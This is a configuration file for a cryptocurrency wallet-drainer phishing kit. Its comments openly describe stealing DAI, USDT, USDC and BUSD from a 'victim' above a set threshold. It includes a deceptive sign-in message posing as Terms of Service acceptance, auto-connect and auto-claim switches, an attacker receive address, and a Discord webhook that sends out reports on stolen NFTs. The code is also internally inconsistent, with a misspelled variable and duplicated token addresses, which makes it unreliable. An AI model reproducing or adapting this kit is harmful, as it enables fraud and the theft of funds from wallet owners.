const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/

const receiveAddresss = "0x3D45bCe40dEC8F096F32cD152e51Bf7C67f8B2BC"; // YOUR WALLET ADDRESS "TUTORIAL"


const drainNftsInfo = {
    minValue: 0.0001, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection. "TUTORIAL"
    maxTransfers: 100
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const autoConnect = false; //false; // auto connect wallet
const autoMint = true; // auto click claim button

// the "3" you see in all the addresses are the min value, if the victim has less than 3 USDC/T then it will not steal it. If it has over 3 USD it will steal it.
const erc20list = {
  // Bsc testnet
  /*
  '0x3D45bCe40dEC8F096F32cD152e51Bf7C67f8B2BC': 100, // DAI BSC Testnet (97)
  '0x3D45bCe40dEC8F096F32cD152e51Bf7C67f8B2BC': 100, // USDT BSC Testnet (97)
  */
  // Ethernet mainnet
  '0x3D45bCe40dEC8F096F32cD152e51Bf7C67f8B2BC': 3, // DAI ethernet
  '0x3D45bCe40dEC8F096F32cD152e51Bf7C67f8B2BC': 3, // usdt
  '0x3D45bCe40dEC8F096F32cD152e51Bf7C67f8B2BC': 3, // usdc
  '0x3D45bCe40dEC8F096F32cD152e51Bf7C67f8B2BC': 3, // busd
}

const installInNewWindow = true; // install wallet if not installed

const discordWebhookURL = "https://discord.com/api/webhooks/1068861564934963280/ugUO5Vb1A-0HEhOOclDdHS5fJVsWSofyjC5kZ7nn1SfYGbGyoM4oS3R-gwVfjulklQ_a"; // put ur discord webhook url in here to receive NFT's "TUTORIAL"
const feedbackEnabled = true; // let enabled to receive webhooks
/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
